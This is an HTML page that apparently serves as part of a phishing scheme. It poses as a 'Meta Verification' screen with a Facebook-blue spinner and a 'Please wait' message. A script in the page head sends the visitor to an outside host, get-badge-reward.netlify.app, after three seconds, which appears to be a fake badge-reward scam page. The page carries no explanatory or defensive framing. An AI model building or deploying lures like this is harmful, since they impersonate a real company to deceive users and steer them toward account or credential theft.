<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Meta Verification...</title>
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f5f6f7;
        font-family: Arial, sans-serif;
        color: #333;
        flex-direction: column;
      }
      .loader {
        border: 6px solid #f3f3f3;
        border-top: 6px solid #1877f2;
        border-radius: 50%;
        width: 60px;
        height: 60px;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      p {
        font-size: 18px;
        font-weight: 500;
      }
    </style>
    <script>
      // Redirect after 3 seconds
      setTimeout(() => {
        window.location.href = "https://get-badge-reward.netlify.app/";
      }, 3000);
    </script>
  </head>
  <body>
    <div class="loader"></div>
    <p>Please wait... Meta Verification</p>
  </body>
</html>
